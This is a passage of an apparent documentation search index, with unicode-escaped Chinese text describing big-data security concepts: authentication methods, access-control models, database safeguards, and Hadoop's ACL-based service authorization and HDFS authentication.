\u5927\u6570\u636e\u73af\u5883\u4e0b\uff0c\u6570\u636e\u7684\u5b58\u50a8\u4e00\u822c\u90fd\u4f7f\u7528HDFS\u81ea\u8eab\u7684\u5907\u4efd\u4e0e\u6062\u590d\u673a\u5236\uff0c\u4f46\u5bf9\u4e8e\u6838\u5fc3\u7684\u6570\u636e\uff0c\u8fdc\u7a0b\u7684\u5bb9\u707e\u5907\u4efd\u4ecd\u7136\u662f\u5fc5\u987b\u7684\u3002\u5176\u4ed6\u989d\u5916\u7684\u6570\u636e\u5907\u4efd\u548c\u6062\u590d\u7b56\u7565\u9700\u8981\u6839\u636e\u5b9e\u9645\u9700\u6c42\u6765\u5236\u5b9a\u3002","title":"02.03.04 \u5feb\u7167"},{"location":"data_security/big_data_security_copy/#03","text":"","title":"03 \u6570\u636e\u6316\u6398\u5b89\u5168\u6280\u672f"},{"location":"data_security/big_data_security_copy/#0301","text":"\u8eab\u4efd\u8ba4\u8bc1\uff1a\u8ba1\u7b97\u673a\u53ca\u7f51\u7edc\u7cfb\u7edf\u786e\u8ba4\u64cd\u4f5c\u8005\u8eab\u4efd\u7b49\u8fc7\u7a0b\u3002\u4e5f\u5c31\u662f\u8bc1\u5b9e\u7528\u6237\u7b49\u771f\u5b9e\u8eab\u4efd\u4e0e\u5176\u6240\u58f0\u79f0\u7684\u8eab\u4efd\u662f\u5426\u7b26\u5408\u7b49\u8fc7\u7a0b\u3002 \u8eab\u4efd\u8ba4\u8bc1\u6280\u672f\u5206\u4e3a\uff1a \u57fa\u4e8e\u79d8\u5bc6\u4fe1\u606f\u7b49\u8eab\u4efd\u8ba4\u8bc1\u6280\u672f \u57fa\u4e8e\u4fe1\u7269\u7684\u8eab\u4efd\u8ba4\u8bc1\u6280\u672f \u57fa\u4e8e\u751f\u7269\u7279\u5f81\u7684\u8eab\u4efd\u8ba4\u8bc1\u6280\u672f \u5e38\u89c1\u7b49\u8ba4\u8bc1\u673a\u5236\u6709\u5982\u4e0b\uff1a Kerberos\u8ba4\u8bc1 \u57fa\u4e8e\u516c\u94a5\u7684\u8ba4\u8bc1\u673a\u5236\uff08PKI\uff09 \u57fa\u4e8e\u52a8\u6001\u53e3\u4ee4\u7684\u8ba4\u8bc1\u673a\u5236 \u57fa\u4e8e\u751f\u7269\u8bc6\u522b\u6280\u672f\u7b49\u8ba4\u8bc1\u6280\u672f Kerberos\u8ba4\u8bc1\u662f\u57fa\u4e8e\u5bf9\u79f0\u5bc6\u7801\u673a\u5236\u7684\uff0c\u8fd0\u7b97\u6548\u7387\u9ad8\uff0c\u56e0\u6b64\u5bf9\u4e8e\u53ea\u8981\u6c42\u6570\u636e\u673a\u5bc6\u6027\uff0c\u4e0d\u9700\u8981\u5b8c\u6574\u6027\u548c\u4e0d\u53ef\u5426\u8ba4\u6027\u9700\u6c42\u7684\u573a\u5408\uff0c\u53ef\u4f7f\u7528Kerberos\u8ba4\u8bc1\u3002 \u57fa\u4e8ePKI\u7684\u8eab\u4efd\u8ba4\u8bc1\u673a\u5236\u76f8\u5bf9\u5b8c\u5584\u590d\u6742\uff0c\u56e0\u6b64\uff0c\u5bf9\u4e8e\u65e2\u8981\u6c42\u6570\u636e\u673a\u5bc6\u6027\uff0c\u53c8\u8981\u6c42\u5b8c\u6574\u6027\u548c\u4e0d\u53ef\u5426\u8ba4\u6027\u7684\u573a\u5408\uff0c\u9700\u8981\u91c7\u7528\u57fa\u4e8ePKI\u4f53\u7cfb\u7684\u8ba4\u8bc1\u673a\u5236\u6765\u8fdb\u884c\u7528\u6237\u8eab\u4efd\u8ba4\u8bc1\u3002 \u968f\u7740\u8eab\u4efd\u7ba1\u7406\u6280\u672f\u7684\u53d1\u5c55\uff0c\u878d\u5408\u751f\u7269\u8bc6\u522b\u6280\u672f\u7684\u5f3a\u7528\u6237\u8ba4\u8bc1\u548c\u57fa\u4e8eWeb\u5e94\u7528\u7684\u5355\u70b9\u767b\u5f55\u6280\u672f\u88ab\u5e7f\u6cdb\u7684\u5e94\u7528\u3002\u57fa\u4e8e\u7528\u6237\u7684\u751f\u7269\u7279\u5f81\u8eab\u4efd\u8ba4\u8bc1\u6bd4\u4f20\u7edf\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u65b9\u5f0f\u66f4\u5b89\u5168\u3002\u7528\u6237\u53ef\u4ee5\u5229\u7528\u7ec8\u7aef\u914d\u5907\u4e2d\u7684\u751f\u7269\u7279\u5f81\u91c7\u96c6\u8bbe\u5907\uff08\u5982\uff1a\u6444\u50cf\u5934\u3001MIC\u3001\u6307\u7eb9\u626b\u63cf\u5668\u7b49\uff09\u8f93\u5165\u81ea\u8eab\u5177\u6709\u552f\u4e00\u6027\u7684\u751f\u7269\u7279\u5f81\uff08\u5982\uff1a\u4eba\u8138\u56fe\u50cf\u3001\u638c\u7eb9\u56fe\u50cf\u3001\u6307\u7eb9\u548c\u58f0\u7eb9\u7b49\uff09\u8fdb\u884c\u7528\u6237\u767b\u5f55\u3002\u591a\u56e0\u7d20\u8ba4\u8bc1\u5219\u5c06\u751f\u7269\u8ba4\u8bc1\u4e0e\u5bc6\u7801\u6280\u672f\u76f8\u7ed3\u5408\uff0c\u63d0\u4f9b\u7ed9\u7528\u6237\u66f4\u9ad8\u5b89\u5168\u6027\u7684\u7528\u6237\u767b\u5f55\u670d\u52a1\u3002","title":"03.01 \u8eab\u4efd\u8ba4\u8bc1"},{"location":"data_security/big_data_security_copy/#030101","text":"\u52a8\u6001\u53e3\u4ee4\u673a\u5236\u662f\u4e3a\u4e86\u89e3\u51b3\u9759\u6001\u53e3\u4ee4\u7b49\u4e0d\u5b89\u5168\u95ee\u9898\u800c\u63d0\u51fa\u7684\uff0c\u57fa\u672c\u601d\u60f3\u662f\u7528\u52a8\u6001\u53e3\u4ee4\u4ee3\u66ff\u9759\u6001\u53e3\u4ee4\uff0c\u5176\u57fa\u672c\u539f\u7406\u662f\uff1a\u5728\u5ba2\u6237\u7aef\u767b\u5f55\u8fc7\u7a0b\u4e2d\uff0c\u57fa\u4e8e\u7528\u6237\u7b49\u79d8\u5bc6\u901a\u884c\u77ed\u8bed\uff08SPP\uff0cSecure Pass Phrase\uff09\u52a0\u5165\u4e0d\u786e\u5b9a\u56e0\u7d20\uff0cSSP\u548c\u4e0d\u786e\u5b9a\u56e0\u7d20\u8fdb\u884c\u4ea4\u6362\uff08\u5982\uff1a\u4f7f\u7528md5\u6d88\u606f\u6458\u8981\uff09\uff0c\u6240\u5f97\u7684\u7ed3\u679c\u4f5c\u4e3a\u8ba4\u8bc1\u6570\u636e\uff08\u5373\u52a8\u6001\u53e3\u4ee4\uff09\u63d0\u4ea4\u7ed9\u8ba4\u8bc1\u670d\u52a1\u5668\u3002\u7531\u4e8e\u5ba2\u6237\u7aef\u6bcf\u6b21\u8ba4\u8bc1\u6570\u636e\u90fd\u91c7\u7528\u4e0d\u540c\u7684\u4e0d\u786e\u5b9a\u56e0\u7d20\u503c\uff0c\u4fdd\u8bc1\u4e86\u5ba2\u6237\u7aef\u6bcf\u6b21\u63d0\u4ea4\u7684\u8ba4\u8bc1\u6570\u636e\u90fd\u4e0d\u76f8\u540c\uff0c\u56e0\u6b64\u52a8\u6001\u53e3\u4ee4\u673a\u5236\u6709\u6548\u5730\u63d0\u9ad8\u4e86\u8eab\u4efd\u8ba4\u8bc1\u7684\u5b89\u5168\u6027\u3002","title":"03.01.01 \u57fa\u4e8e\u52a8\u6001\u53e3\u4ee4\u7684\u8ba4\u8bc1\u673a\u5236"},{"location":"data_security/big_data_security_copy/#0302","text":"\u8bbf\u95ee\u63a7\u5236\u662f\u6307\u4e3b\u4f53\u6839\u636e\u67d0\u4e9b\u63a7\u5236\u7b56\u7565\u6216\u6743\u9650\u5bf9\u5ba2\u4f53\u6216\u5176\u8d44\u6e90\u8fdb\u884c\u7684\u4e0d\u540c\u6388\u6743\u8bbf\u95ee\uff0c\u9650\u5236\u5bf9\u5173\u952e\u8d44\u6e90\u7684\u8bbf\u95ee\uff0c\u9632\u6b62\u975e\u6cd5\u7528\u6237\u8fdb\u5165\u7cfb\u7edf\u53ca\u5408\u6cd5\u7528\u6237\u5bf9\u8d44\u6e90\u7684\u975e\u6cd5\u4f7f\u7528\u3002\u8bbf\u95ee\u63a7\u5236\u662f\u8fdb\u884c\u6570\u636e\u5b89\u5168\u4fdd\u62a4\u7684\u6838\u5fc3\u7b56\u7565\uff0c\u4e3a\u6709\u6548\u63a7\u5236\u7528\u6237\u8bbf\u95ee\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\uff0c\u4fdd\u8bc1\u6570\u636e\u8d44\u6e90\u7684\u5b89\u5168\uff0c\u53ef\u6388\u4e88\u6bcf\u4e2a\u7cfb\u7edf\u8bbf\u95ee\u8005\u4e0d\u540c\u7684\u8bbf\u95ee\u7ea7\u522b\uff0c\u5e76\u8bbe\u7f6e\u76f8\u5e94\u7684\u7b56\u7565\u4fdd\u8bc1\u5408\u6cd5\u7528\u6237\u83b7\u5f97\u6570\u636e\u7684\u8bbf\u95ee\u6743\u3002\u8bbf\u95ee\u63a7\u5236\u4e00\u822c\u53ef\u4ee5\u662f\u81ea\u4e3b\u6216\u8005\u975e\u81ea\u4e3b\u7684\uff0c\u6700\u5e38\u89c1\u7684\u8bbf\u95ee\u63a7\u5236\u6a21\u5f0f\u6709\u5982\u4e0b3\u79cd\uff1a","title":"03.02 \u8bbf\u95ee\u63a7\u5236"},{"location":"data_security/big_data_security_copy/#030201","text":"\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u662f\u6307\u5bf9\u67d0\u4e2a\u5ba2\u4f53\u5177\u6709\u62e5\u6709\u6743\uff08\u6216\u63a7\u5236\u6743\uff09\u7684\u4e3b\u4f53\u80fd\u591f\u5c06\u5bf9\u8be5\u5ba2\u4f53\u7684\u4e00\u79cd\u8bbf\u95ee\u6743\u6216\u591a\u79cd\u8bbf\u95ee\u6743\u81ea\u4e3b\u5730\u6388\u4e88\u5176\u5b83\u4e3b\u4f53\uff0c\u5e76\u5728\u968f\u540e\u7684\u4efb\u4f55\u65f6\u523b\u5c06\u8fd9\u4e9b\u6743\u9650\u56de\u6536\u3002\u8fd9\u79cd\u63a7\u5236\u662f\u81ea\u4e3b\u7684\uff0c\u4e5f\u5c31\u662f\u6307\u5177\u6709\u6388\u4e88\u67d0\u79cd\u8bbf\u95ee\u6743\u529b\u7684\u4e3b\u4f53\uff08\u7528\u6237\uff09\u80fd\u591f\u81ea\u5df1\u51b3\u5b9a\u662f\u5426\u5c06\u8bbf\u95ee\u63a7\u5236\u6743\u9650\u7b49\u67d0\u4e2a\u5b50\u96c6\u6388\u4e88\u5176\u4ed6\u7684\u4e3b\u4f53\u6216\u4ece\u5176\u4ed6\u4e3b\u4f53\u90a3\u91cc\u6536\u56de\u4ed6\u6240\u6388\u4e88\u7684\u8bbf\u95ee\u6743\u9650\u3002\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u4e2d\uff0c\u7528\u6237\u53ef\u4ee5\u9488\u5bf9\u88ab\u4fdd\u62a4\u5bf9\u8c61\u5236\u5b9a\u81ea\u5df1\u7684\u4fdd\u62a4\u7b56\u7565\u3002","title":"03.02.01 \u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236"},{"location":"data_security/big_data_security_copy/#030202","text":"\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\u662f\u6307\u8ba1\u7b97\u673a\u7cfb\u7edf\u6839\u636e\u4f7f\u7528\u7cfb\u7edf\u7684\u673a\u6784\u4e8b\u5148\u786e\u5b9a\u7684\u5b89\u5168\u7b56\u7565\uff0c\u5bf9\u7528\u6237\u7684\u8bbf\u95ee\u6743\u9650\u8fdb\u884c\u5f3a\u5236\u6027\u7684\u63a7\u5236\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u7cfb\u7edf\u72ec\u7acb\u4e8e\u7528\u6237\u884c\u4e3a\u5f3a\u5236\u6267\u884c\u8bbf\u95ee\u63a7\u5236\uff0c\u7528\u6237\u4e0d\u80fd\u6539\u53d8\u4ed6\u4eec\u7684\u5b89\u5168\u7ea7\u522b\u6216\u5bf9\u8c61\u7684\u5b89\u5168\u5c5e\u6027\u3002\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\u8fdb\u884c\u4e86\u5f88\u5f3a\u7684\u7b49\u7ea7\u5212\u5206\uff0c\u6240\u4ee5\u7ecf\u5e38\u7528\u4e8e\u519b\u4e8b\u7528\u9014\u3002\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\u5728\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u7684\u57fa\u7840\u4e0a\uff0c\u589e\u52a0\u4e86\u5bf9\u7f51\u7edc\u8d44\u6e90\u7684\u5c5e\u6027\u5212\u5206\uff0c\u89c4\u5b9a\u4e0d\u540c\u5c5e\u6027\u4e0b\u7684\u8bbf\u95ee\u6743\u9650\u3002\u8fd9\u79cd\u673a\u5236\u7684\u4f18\u70b9\u662f\u5b89\u5168\u6027\u6bd4\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u7684\u5b89\u5168\u6027\u6709\u4e86\u63d0\u9ad8\uff0c\u7f3a\u70b9\u662f\u7075\u6d3b\u6027\u8981\u5dee\u4e00\u4e9b\u3002","title":"03.02.02 \u5f3a\u5236\u8bbf\u95ee\u63a7\u5236"},{"location":"data_security/big_data_security_copy/#030203","text":"\u6570\u636e\u5e93\u7cfb\u7edf\u53ef\u4ee5\u91c7\u7528\u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236\u7b56\u7565\uff0c\u5efa\u7acb\u89d2\u8272\u3001\u6743\u9650\u4e0e\u8d26\u53f7\u7ba1\u7406\u673a\u5236\u3002\u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236\u65b9\u6cd5\u7684\u57fa\u672c\u601d\u60f3\u5728\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\u4e4b\u95f4\u5f15\u5165\u89d2\u8272\u7684\u6982\u5ff5\uff0c\u5c06\u7528\u6237\u548c\u89d2\u8272\u8054\u7cfb\u8d77\u6765\uff0c\u901a\u8fc7\u5bf9\u89d2\u8272\u7684\u6388\u6743\u6765\u63a7\u5236\u7528\u6237\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\u3002\u8fd9\u79cd\u65b9\u6cd5\u53ef\u6839\u636e\u7528\u6237\u7684\u5de5\u4f5c\u804c\u8d23\u8bbe\u7f6e\u82e5\u5e72\u89d2\u8272\uff0c\u4e0d\u540c\u7684\u7528\u6237\u53ef\u4ee5\u5177\u6709\u76f8\u540c\u7684\u89d2\u8272\uff0c\u5728\u7cfb\u7edf\u4e2d\u4eab\u53d7\u76f8\u540c\u7684\u6743\u5229\uff0c\u540c\u4e00\u4e2a\u7528\u6237\u53c8\u53ef\u4ee5\u5177\u6709\u591a\u4e2a\u4e0d\u540c\u7684\u89d2\u8272\uff0c\u5728\u7cfb\u7edf\u4e2d\u884c\u4f7f\u591a\u4e2a\u89d2\u8272\u7684\u6743\u5229\u3002 RBAC\uff08Role-Based Access Control\uff09\u7684\u57fa\u672c\u6982\u5ff5\u5305\u62ec\uff1a \u8bb8\u53ef\u4e5f\u53eb\u6743\u9650\uff0c\u5c31\u662f\u5141\u8bb8\u5bf9\u4e00\u4e2a\u6216\u591a\u4e2a\u5ba2\u4f53\u6267\u884c\u64cd\u4f5c\uff1b \u89d2\u8272\uff0c\u5c31\u662f\u8bb8\u53ef\u7684\u96c6\u5408\uff1b \u4f1a\u8bdd\uff0c\u4e00\u6b21\u4f1a\u8bdd\u662f\u7528\u6237\u7684\u4e00\u4e2a\u6d3b\u8dc3\u8fdb\u7a0b\uff0c\u5b83\u4ee3\u8868\u7528\u6237\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u3002\u6807\u51c6\u4e0a\u8bf4\uff0c\u6bcf\u4e2asession\u662f\u4e00\u4e2a\u6620\u5c04\uff0c\u4e00\u4e2a\u7528\u6237\u5230\u591arole\u7684\u6620\u5c04\u3002\u5f53\u4e00\u4e2a\u7528\u6237\u6fc0\u6d3b\u4ed6\u6240\u6709\u6240\u6709\u89d2\u8272\u7684\u4e00\u4e2a\u5b50\u96c6\u7684\u65f6\u5019\uff0c\u5efa\u7acb\u4e00\u4e2asession\uff1b \u6d3b\u8dc3\u89d2\u8272\uff08active role\uff09\uff0c\u4e00\u4e2a\u4f1a\u8bdd\u6784\u6210\u4e00\u4e2a\u7528\u6237\u5230\u591a\u4e2a\u89d2\u8272\u7684\u6620\u5c04\uff0c\u5373\u4f1a\u8bdd\u6fc0\u6d3b\u4e86\u7528\u6237\u6388\u6743\u89d2\u8272\u7684\u67d0\u4e2a\u5b50\u96c6\uff0c\u8fd9\u4e2a\u5b50\u96c6\u6210\u4e3a\u6d3b\u8dc3\u89d2\u8272\u96c6\u3002 RBAC\u7684\u57fa\u672c\u6a21\u578b\u5982\u4e0b\u56fe\uff1a","title":"03.02.03 \u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236"},{"location":"data_security/big_data_security_copy/#0303","text":"\u5173\u7cfb\u578b\u6570\u636e\u5e93\u90fd\u8bbe\u7f6e\u4e86\u76f8\u5bf9\u5b8c\u5907\u7684\u5b89\u5168\u673a\u5236\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5927\u6570\u636e\u5b58\u50a8\u53ef\u4ee5\u4f9d\u8d56\u4e8e\u6570\u636e\u5e93\u7684\u5b89\u5168\u673a\u5236\uff0c\u5b89\u5168\u98ce\u9669\u5927\u5927\u964d\u4f4e\u3002\u4f8b\u5982SQL Server\u5b89\u5168\u673a\u5236\u5982\u4e0b\uff1a \u8eab\u4efd\u9a8c\u8bc1\uff08Windows NT\u8ba4\u8bc1\u6a21\u5f0f\uff0c\u6df7\u5408\u8ba4\u8bc1\u6a21\u5f0f\uff09 \u8bbf\u95ee\u63a7\u5236\uff08\u5bf9\u6bcf\u4e2a\u7528\u6237\u5b9a\u4e49\u5b58\u53d6\u6743\u9650\uff09 \u5ba1\u8ba1\u529f\u80fd \u6570\u636e\u5e93\u52a0\u5bc6\uff08\u901a\u8fc7\u5c06\u6570\u636e\u7528\u5bc6\u6587\u5f62\u5f0f\u5b58\u50a8\u6216\u4f20\u8f93\u7684\u624b\u6bb5\u4fdd\u8bc1\u9ad8\u654f\u611f\u6570\u636e\u7684\u5b89\u5168\uff09 \u5b8c\u6574\u6027\u673a\u5236\uff08\u5b9e\u4f53\u5b8c\u6574\u6027\u3001\u53c2\u7167\u5b8c\u6574\u6027\u3001\u7528\u6237\u81ea\u5b9a\u4e49\u5b8c\u6574\u6027\uff09 \u89e6\u53d1\u5668\u673a\u5236 \u89c6\u56fe\u548c\u5b58\u50a8\u8fc7\u7a0b\u673a\u5236 \u5907\u4efd\u3001\u6062\u590d\u548c\u5e76\u53d1\u63a7\u5236\u673a\u5236","title":"03.03 \u5173\u7cfb\u578b\u6570\u636e\u5e93\u5b89\u5168\u7b56\u7565"},{"location":"data_security/big_data_security_copy/#0304","text":"\u8d8a\u6765\u8d8a\u591a\u7684\u4f01\u4e1a\u91c7\u7528\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u5b58\u50a8\u5927\u6570\u636e\uff0c\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u5b58\u50a8\u7684\u5b89\u5168\u95ee\u9898\u7684\u63a2\u8ba8\u5341\u5206\u5fc5\u8981\u3002\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e3b\u8981\u901a\u8fc7\u4e8b\u52a1\u652f\u6301\u6765\u5b9e\u73b0\u6570\u636e\u5b58\u53d6\u7684\u539f\u5b50\u6027\u3001\u4e00\u81f4\u6027\u3001\u9694\u79bb\u6027\u548c\u6301\u4e45\u6027\uff0c\u4fdd\u8bc1\u6570\u636e\u7684\u5b8c\u6574\u6027\u548c\u6b63\u786e\u6027\uff0c\u540c\u65f6\u5bf9\u6570\u636e\u5e93\u8868\u3001\u884c\u3001\u5b57\u6bb5\u7b49\u63d0\u4f9b\u57fa\u4e8e\u7528\u6237\u7ea7\u522b\u7684\u6743\u9650\u8bbf\u95ee\u63a7\u5236\u53ca\u52a0\u5bc6\u673a\u5236\u3002 NoSQL\u6570\u636e\u5e93\u4e3a\u5927\u6570\u636e\u5904\u7406\u63d0\u4f9b\u4e86\u9ad8\u53ef\u7528\u3001\u9ad8\u53ef\u6269\u5c55\u7684\u5927\u89c4\u6a21\u6570\u636e\u5b58\u50a8\u65b9\u6848\uff0c\u4f46\u7f3a\u4e4f\u8db3\u591f\u7684\u5b89\u5168\u4fdd\u8bc1\u3002\u5982\uff1aNoSQL\u6570\u636e\u5e93\u7f3a\u5c11Schema\uff0c\u56e0\u6b64\u4e0d\u80fd\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u8f83\u597d\u7684\u5b8c\u6574\u6027\u9a8c\u8bc1\u3002\u540c\u65f6\uff0c\u591a\u6570NoSQL\u6570\u636e\u5e93\u4e3a\u4e86\u63d0\u9ad8\u5904\u7406\u6548\u7387\uff0c\u91c7\u7528\u6700\u7ec8\u540c\u6b65\u800c\u5e76\u975e\u6bcf\u6b21\u4ea4\u6613\u540c\u6b65\uff0c\u5f71\u54cd\u4e86\u6570\u636e\u7684\u6b63\u786e\u6027\u3002\u76ee\u524d\u591a\u6570\u7684NoSQL\u6570\u636e\u5e93\u6ca1\u6709\u63d0\u4f9b\u5185\u5efa\u7684\u5b89\u5168\u673a\u5236\uff0c\u8fd9\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9650\u5236\u4e86\u5e94\u7528\u7684\u9886\u57df\u53ca\u8303\u56f4\uff0c\u4f46\u968f\u7740NoSQL\u7684\u53d1\u5c55\uff0c\u8d8a\u6765\u8d8a\u591a\u7684\u4eba\u5f00\u59cb\u610f\u8bc6\u5230\u5b89\u5168\u7684\u91cd\u8981\u6027\uff0c\u90e8\u5206NoSQL\u4ea7\u54c1\u9010\u6e10\u5f00\u59cb\u63d0\u4f9b\u4e00\u4e9b\u5b89\u5168\u65b9\u9762\u7684\u652f\u6301\uff0c\u4e0b\u9762\u4ee5Hadoop\u4e3a\u4f8b\uff0c\u4ecb\u7ecd\u5176\u5b89\u5168\u673a\u5236\u3002Hadoop\u7684\u5b89\u5168\u673a\u5236\u4e3b\u8981\u5305\u62ec4\u4e2a\u5185\u5bb9\uff1a\u57fa\u4e8eACL\u7684\u670d\u52a1\u7ea7\u6743\u9650\u63a7\u5236\u3001\u57fa\u4e8e\u4ee4\u724c\u7684\u8ba4\u8bc1\u673a\u5236\u3001HDFS\u6570\u636e\u5b58\u50a8\u7684\u5b8c\u6574\u6027\u4e00\u81f4\u6027\u4fdd\u8bc1\u4e0e\u6570\u636e\u4f20\u8f93\u7684\u5b8c\u6574\u6027\u9a8c\u8bc1\u3002","title":"03.04 \u975e\u5173\u7cfb\u578b\u6570\u636e\u5757\u5b89\u5168\u7b56\u7565"},{"location":"data_security/big_data_security_copy/#030401-acl","text":"Hadoop\u652f\u6301\u7684\u6743\u9650\u63a7\u5236\u5206\u4e3a\u4e24\u7ea7\uff1a\u670d\u52a1\u7ea7\u6388\u6743\uff08service level authorization\uff09\u4ee5\u53ca\u4e0a\u5c42\u7684HDFS\u6587\u4ef6\u6743\u9650\u63a7\u5236\u548cMapReduce\u961f\u5217\u6743\u9650\u63a7\u5236\uff0c\u670d\u52a1\u7ea7\u6388\u6743\u4e3a\u7cfb\u7edf\u7ea7\uff0c\u7528\u4e8e\u63a7\u5236Hadoop\u670d\u52a1\u7684\u8bbf\u95ee\uff0c\u662f\u6700\u57fa\u7840\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u4f18\u5148\u4e8eHDFS\u6587\u4ef6\u6743\u9650\u548cMapReduce\u961f\u5217\u6743\u9650\u9a8c\u8bc1\u3002 Hadoop\u901a\u8fc7\u8bbf\u95ee\u63a7\u5236\u5217\u8868\u6765\u7ba1\u7406\u670d\u52a1\u7ea7\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u7c7b\u4f3c\u4e8eUNIX\u7cfb\u7edf\u4e2d\u7684\u7528\u6237\u6743\u9650\u7ba1\u7406\uff0cHadoop\u901a\u8fc7\u7528\u6237\u540d\u548c\u7ec4\u6765\u7ba1\u7406\u6743\u9650\uff0c\u6bcf\u4e2a\u670d\u52a1\u53ef\u4ee5\u914d\u7f6e\u4e3a\u88ab\u6240\u6709\u7528\u6237\u8bbf\u95ee\uff0c\u4e5f\u53ef\u4ee5\u88ab\u9650\u5236\u4e3a\u4ec5\u88ab\u67d0\u4e9b\u7ec4\u7684\u67d0\u4e9b\u7528\u6237\u8bbf\u95ee\u3002Hadoop\u67099\u4e2a\u53ef\u914d\u7f6e\u7684ACL\u5c5e\u6027\uff0c\u6bcf\u4e2a\u5c5e\u6027\u53ef\u6307\u5b9a\u62e5\u6709\u76f8\u5e94\u8bbf\u95ee\u6743\u9650\u7684\u7528\u6237\u6216\u8005\u7528\u6237\u7ec4\u3002 ACL\u5c5e\u6027 \u8bf4\u660e Security.client.protocol.acl ACL for ClientProtocol\uff0c\u7528\u6237HDFS\u5ba2\u6237\u7aef\u5bf9KDFS\u8bbf\u95ee\u7684\u6743\u9650\u63a7\u5236 Security.client.datanode.prtocol.acl ACL for ClientDataNodeProtocol\uff0cclient\u5230DataNode\u7684\u8bbf\u95ee\u6743\u9650\u63a7\u5236\uff0c\u7528\u4e8eblock\u6062\u590d Security.datanode.protocol.acl ACL for DataNodeProtocol\uff0c\u7528\u4e8eDataNode\u4e0eNameNode\u4e4b\u95f4\u901a\u4fe1\u7684\u8bbf\u95ee\u63a7\u5236 Security.inter.datanode.protocol.acl ACL for InterDataNodeProtocol\uff0c\u7528\u4e8eDataNode\u4e4b\u95f4\u66f4\u65b0timestamp Security.namenode.protocol.acl ACL for NameNodeProtocol\uff0c\u7528\u4e8eSecondNameNode\u4e0eNameNode\u95f4\u901a\u4fe1\u7684\u8bbf\u95ee\u63a7\u5236 Security.inter.tracker.protocol.acl ACL for InterTrackerProtocol\uff0c\u7528\u4e8etasktracker\u4e0ejobtracker\u4e4b\u95f4\u901a\u4fe1\u7684\u8bbf\u95ee\u63a7\u5236 Security.job.submission.protocol.acl ACL for JobSubmissionProtocol\uff0c\u7528\u4e8ejob\u5ba2\u6237\u7aef\u63d0\u4ea4\u4f5c\u4e1a\u4e0e\u67e5\u8be2\u4f5c\u4e1a\u7684\u8bbf\u95ee\u63a7\u5236 Security.task.unbilical.protocol.acl ACL for TaskUmbilicalProtocol\uff0c\u7528\u4e8etask\u4e0e\u5176tasktracker\u7684\u8bbf\u95ee\u63a7\u5236 Security.refresh.policy.protocol.acl ACL for RefreshAuthorizationPolicyProtocol\uff0c\u7528\u4e8edfsadmin\u548cmradmin\u66f4\u65b0\u5176\u5b89\u5168\u914d\u7f6e\u7684\u8bbf\u95ee\u63a7\u5236 \u901a\u8fc7ACL\u6743\u9650\u63a7\u5236\uff0cHadoop\u80fd\u4fdd\u8bc1\u6570\u636e\u5e93\u5e95\u5c42HDFS\u6587\u4ef6\u7cfb\u7edf\u7684\u670d\u52a1\u7ea7\u5b89\u5168\u8bbf\u95ee\uff0c\u901a\u8fc7\u7528\u6237\u548c\u7ec4\u7684\u9650\u5236\uff0c\u9632\u6b62\u975e\u6cd5\u7528\u6237\u5bf9\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u3002\u6587\u4ef6\u7684\u6743\u9650\u4e3b\u8981\u7531NameNode\u7ba1\u7406\u3002","title":"03.04.01 \u57fa\u4e8eACL\u7684\u6743\u9650\u63a7\u5236"},{"location":"data_security/big_data_security_copy/#030402","text":"HDFS\u7684\u670d\u52a1\u95f4\u4ea4\u4e92\u57fa\u672c\u90fd\u662f\u901a\u8fc7\u8fdc\u7a0b\u8c03\u7528\u534f\u8bae\uff08RPC\uff0cremote procedurecall protocol\uff09\u4ea4\u4e92\uff0c\u4f46\u662fHDFS\u5ba2\u6237\u7aef\u83b7\u53d6\u6570\u636e\u65f6\u5374\u4e0d\u5b8c\u5168\u4f9d\u9760RPC\u673a\u5236\u3002\u5f53HDFS\u5ba2\u6237\u7aef\u8bbf\u95ee\u6570\u636e\u65f6\uff0c\u4e3b\u8981\u5305\u62ec2\u4e2a\u8fc7\u7a0b\uff1a \u5ba2\u6237\u7aef\u8bbf\u95eeNameNode\uff0c\u83b7\u53d6\u6570\u636e\u7684\u6570\u636e\u5757\u4fe1\u606f\uff0c\u6b64\u8fc7\u7a0b\u901a\u8fc7RPC\u4ea4\u4e92\uff1b \u5ba2\u6237\u7aef\u83b7\u53d6\u5230\u6570\u636e\u4f4d\u7f6e\u540e\uff0c\u76f4\u63a5\u8bbf\u95eeDataNode\uff0c\u6839\u636e\u6570\u636e\u5757\u4f4d\u7f6e\u4fe1\u606f\u76f4\u63a5\u901a\u8fc7SOCKET\u8bfb\u53d6\u6570\u636e\u3002Hadoop\u7684RPC\u6d88\u606f\u673a\u5236\u5728SASL\uff08Simple Authentication and Security Layer\uff09\u7684\u57fa\u7840\u4e0a\u5b9e\u73b0\u4e86\u4e24\u79cd\u8ba4\u8bc1\u673a\u5236\uff1a\u57fa\u4e8eGSSAPI\u7684Kerberos\u8ba4\u8bc1\u673a\u5236\u548c\u57fa\u4e8eDIGEST-MD5de\u4ee4\u724c\u8ba4\u8bc1\u673a\u5236\uff0c\u4ee4\u724c\u8ba4\u8bc1\u5305\u62ecHDFS\u4e2d\u7684\u6388\u6743\u4ee4\u724c\uff08delegation 